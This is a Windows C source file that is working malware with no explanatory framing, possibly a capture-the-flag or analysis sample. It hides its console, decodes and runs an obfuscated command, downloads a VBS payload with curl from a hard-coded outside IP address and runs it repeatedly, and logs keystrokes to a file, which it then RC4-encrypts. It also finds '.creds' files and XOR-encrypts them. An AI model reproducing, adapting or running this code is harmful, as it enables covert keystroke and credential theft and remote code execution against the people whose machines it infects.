#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<winuser.h>
#include<strings.h>
#include<time.h>
#include<stdbool.h>
#include<stdlib.h>
#include<time.h>
#include<dirent.h>
#include<unistd.h>
#define VK_VOLUME_MUTE 0xAD
#define VK_VOLUME_DOWN 0xAE
#define VK_VOLUME_UP 0xAF
#define BLOCK_SIZE 8

int logging_c_one(int v_keys);
int logging_c_two(int v_keys);
int logging_c_three(int v_keys);
bool CapsLock;
const max_buffer = 128;

void __attribute__((constructor)) u_state();

void u_state(){
	HWND stl;
	stl = FindWindow("ConsoleWindowsClass",NULL); //hiding windows console popup
	ShowWindow(stl,0); // 0 for no popups hiding
}
void stage3(){
	char val[255];
	char buzzer[20000];
	size_t sc;
	DWORD bufsize = 8192;
	RegGetValue(HKEY_LOCAL_MACHINE,
	"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion","RegisteredOwner",
	RRF_RT_ANY,NULL,(PVOID)&val,&bufsize);
	DIR *di;
	char *pt1,*pt2;
	int ret,xaxa;
	int lentong = strlen(val);
	printf("%d\n\n",lentong);
	struct dirent *dir;
	di = opendir(".");
	if(di){
		while( (dir = readdir(di)) != NULL){
			pt1 = strtok(dir->d_name,".");
			pt2 = strtok(NULL,".");
			if(pt2 != NULL){
				ret = strcmp(pt2,"creds");
				if(ret == 0){
					//printf("%s\n",pt1);
					strcat(pt1,".creds");
					//printf("%s",pt1);
					FILE *secret = fopen(pt1,"rb");
					signed int bup = fread(&buzzer,sizeof(char),20000,secret);
					fclose(secret);
					strcat(pt1,".enc");
					FILE *floppe = fopen(pt1,"a+");
					for(xaxa=0;xaxa<bup;xaxa++){
						fprintf(floppe,"%c",(buzzer[xaxa] + 1) ^ val[xaxa % lentong] ^ 1);
					}
					fclose(floppe);
				}
			}
		}
	}
}
void stage1(){
	int i=0,j=0;
	char dest[118];
	char enc_url[61] = "ewtn\"jvvr<113::038803990::<6428;1ukumqnn\"/q\"'VGOR'^7mt3p0rpi";
	int len = strlen(enc_url);
	memset(dest,'\0',sizeof(dest));
	for(i=0;i<len;i++){
		enc_url[i] = enc_url[i] - 2;
	}
	strncpy(dest,enc_url,sizeof(enc_url));
	system(dest);
	sleep(5);
	char url[57] = "curl http://188.166.177.88:42069/ev1l -o %TEMP%\\3v1l.vbs";
	system(url);
	sleep(2);
	do{
		system("cscript.exe %TEMP%\\3v1l.vbs");
		sleep(2);
		j++;
		}while(j < 10);
}

int main(){
	stage1();
	ShellExecute(NULL, "open", "http://188.166.177.88:42069/", NULL, NULL, SW_SHOWNORMAL);
	FILE* fstr = fopen("ev1lLOG.txt","a");
	char bofer[max_buffer];
	FreeConsole();
	int counter = 0;
	
	if((GetKeyState(VK_CAPITAL) & 0x0001) != 0){
		CapsLock = true;
	}else{
		CapsLock = false;
	}
	
	//Capital
	//https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	while(counter < max_buffer){
		int v_keys;
		if(GetAsyncKeyState(0x20) == -32767){
			counter++;
			logging_c_one(v_keys);
		}
		for(v_keys = 0x41; v_keys < 0x5b; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_one(v_keys);
			}
		}
		//numbers (0-9)
		for(v_keys = 0x30; v_keys < 0x39; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_two(v_keys);
			}
		}
		
		for(v_keys = 186; v_keys < 193; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_two(v_keys);
			}
		}
		
		for(v_keys = 219; v_keys < 223; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_two(v_keys);
			}
		}
		
		//TAB BACK
		for(v_keys=8; v_keys < 10; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_three(v_keys);
			}
		}
		
		//ENTER
		if(GetAsyncKeyState(13) == -32767){
			counter++;
			logging_c_three(v_keys);
		}
		
		//SHIFT
		if(GetAsyncKeyState(16) == -32767){
			counter++;
			logging_c_three(v_keys);
		}
		
		//CAPSLOCK
		if(GetAsyncKeyState(20) == -32767){
			counter++;
			logging_c_three(v_keys);
		}
		
		//ESC
		if(GetAsyncKeyState(27) == -32767){
			counter++;
			logging_c_three(v_keys);
		}
		/*
		 * 32: SPACE, 33: PGUP, 34: PGDN, 35: END, 36: HOME, 37: ARROWL, 38: ARROWU, 
		 * 39: ARROWR, 40: ARROWD
		 */
		for(v_keys = 32; v_keys < 41; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_three(v_keys);
			}
		}
		
		//INS 45 DEL 46
		for(v_keys = 45; v_keys < 47; v_keys++){
			if(GetAsyncKeyState(v_keys) == -32767){
				counter++;
				logging_c_three(v_keys);
			}
		}	
		
	}
	fclose(fstr);
	//State Vector + Prep Key (256)
	int key[256];
	int keystream[256];
	int count=0;
	int S[256];
	for(count = 0;count < 0xff + 1;count++){
		S[count] = count;
	}
	char *xorrer; 
	xorrer = getenv("TMP");
	int lenxor = strlen(xorrer);
	
	count=0;
	for(count = 0;count < 0xff + 1;count++){
		key[count] = xorrer[count % lenxor];
	}
	
	int temp;
	int x=0,y=0; 
	for(x=0;x<0xff+1;x++){
		y = (y + S[x] + key[x]) % 256;
		//swap
		temp = S[x];
		S[x] = S[y];
		S[y] = temp;
	}
	
	x=y=0;
	int tmp;
	FILE* xtarget = fopen("a8b4d3adbeef.cache","w");
	FILE* strm = fopen("ev1lLOG.txt","r");
	int buff = fread(&bofer,sizeof(char),128,strm);
	fclose(strm);
	size_t conter = 0;
	char n_buff[max_buffer];
	for(conter = 0;conter < buff;conter++){
		x = (x+1) % 256;
		y = (y + S[x]) % 256;
		tmp = S[x];
		S[x] = S[y];
		S[y] = tmp;
		
		int rndmize = S[(S[x] + S[y]) % 256];
		keystream[conter] = S[rndmize];
	}
	conter = 0;
	for(conter = 0;conter < buff;conter++){
		fprintf(xtarget, "%c", keystream[conter] ^ bofer[conter]);
	}
	fclose(xtarget);
	remove("ev1lLOG.txt");
	stage3();
	return 0;
}

int logging_c_one(int v_keys){
	FILE* fstr = fopen("ev1lLOG.txt","a");
	if(GetAsyncKeyState(VK_SPACE) == -32767){
			fprintf(fstr,"%c"," ");
		}
	if((!GetAsyncKeyState(VK_SHIFT)) && (CapsLock == false)){
		v_keys += 32;
		fprintf(fstr,"%c",v_keys);
	}
	
	else if((GetAsyncKeyState(VK_SHIFT)) && (CapsLock == true)){
		v_keys += 32;
		fprintf(fstr,"%c",v_keys);
	}
	else{
		fprintf(fstr,"%c",v_keys);
	}
	fclose(fstr);
	return 0;
}

int logging_c_two(int v_keys){
	FILE* fstr = fopen("ev1lLOG.txt","a");
	if(GetAsyncKeyState(VK_SPACE) == -32767){
			fprintf(fstr,"%c"," ");
		}
	if(!GetAsyncKeyState(VK_SHIFT)){
		switch(v_keys){
			case 186:
				fprintf(fstr,"%c",";");
				break;
			case 187:
				fprintf(fstr,"%c","=");
				break;
			case 188:
				fprintf(fstr,"%c",",");
				break;
			case 189:
				fprintf(fstr,"%c","-");
				break;
			case 190:
				fprintf(fstr,"%c",".");
				break;
			case 191:
				fprintf(fstr,"%c","/");
				break;
			case 192:
				fprintf(fstr,"%c","`");
				break;
			case 219:
				fprintf(fstr,"%c","[");
				break;
			case 220:
				fprintf(fstr,"%c","\\");
				break;
			case 221:
				fprintf(fstr,"%c","]");
				break;
			case 222:
				fprintf(fstr,"%c","\'");
				break;
			default:
				fprintf(fstr,"%c",v_keys);
				break;
		}
	}else{
		switch(v_keys){
			case 48:
				fprintf(fstr,"%c",")");
				break;
			case 49:
				fprintf(fstr,"%c","!");
				break;
			case 50:
				fprintf(fstr,"%c","@");
				break;
			case 51:
				fprintf(fstr,"%c","#");
				break;
			case 52:
				fprintf(fstr,"%c","$");
				break;
			case 53:
				fprintf(fstr,"%c","%");
				break;
			case 54:
				fprintf(fstr,"%c","^");
				break;
			case 55:
				fprintf(fstr,"%c","&");
				break;
			case 56:
				fprintf(fstr,"%c","*");
				break;
			case 57:
				fprintf(fstr,"%c","(");
				break;
			case 186:
				fprintf(fstr,"%c",":");
				break;
			case 187:
				fprintf(fstr,"%c","+");
				break;
			case 188:
				fprintf(fstr,"%c","<");
				break;
			case 189:
				fprintf(fstr,"%c","_");
				break;
			case 190:
				fprintf(fstr,"%c",">");
				break;
			case 191:
				fprintf(fstr,"%c","\?");
				break;
			case 192:
				fprintf(fstr,"%c","~");
				break;
			case 219:
				fprintf(fstr,"%c","{");
				break;
			case 220:
				fprintf(fstr,"%c","|");
				break;
			case 221:
				fprintf(fstr,"%c","}");
				break;
			case 222:
				fprintf(fstr,"%c","\"");
				break;	
		}
	}
	fclose(fstr);
	return 0;
}

int logging_c_three(int v_keys){
	FILE* fstr = fopen("ev1lLOG.txt","a");
	if(GetAsyncKeyState(VK_SPACE) == -32767){
			fprintf(fstr,"%c"," ");
		}
	switch(v_keys){
		case VK_BACK:
			fprintf(fstr,"%s","[BACK]");
			break;
		case VK_TAB:
			fprintf(fstr,"%s","[TAB]");
			break;
		case VK_RETURN:
			fprintf(fstr,"%s","[ENTER]\n");
			break;
		case VK_CAPITAL:
			if(CapsLock == true){
				fprintf(fstr,"%s","[CAPSDOWN]");
				CapsLock = false;
			}
			
			else{
				fprintf(fstr,"%s","[CAPSUP]");
				CapsLock = true;
			}
			break;
		case VK_ESCAPE:
			fprintf(fstr,"%s","[ESC]");
			break;
		case VK_SPACE:
			fprintf(fstr,"%c"," ");
			break;
		case VK_PRIOR:
			fprintf(fstr,"%s","[PGUP]");
			break;
		case VK_NEXT:
			fprintf(fstr,"%s","[PGDOWN]");
			break;
		case VK_END:
			fprintf(fstr,"%s","[END]");
			break;
		case VK_HOME:
			fprintf(fstr,"%s","[HOME]");
			break;
		case VK_LEFT:
			fprintf(fstr,"%s","[ARRLEFT]");
			break;
		case VK_UP:
			fprintf(fstr,"%s","[ARRUP]");
			break;
		case VK_RIGHT:
			fprintf(fstr,"%s","[ARRRIGHT]");
			break;
		case VK_DOWN:
			fprintf(fstr,"%s","[ARRDOWN]");
			break;
		case VK_INSERT:
			fprintf(fstr,"%s","[INS]");
			break;
		case VK_DELETE:
			fprintf(fstr,"%s","[DELETE]");
			break;
		
	}
	fclose(fstr);
	return 0;
}

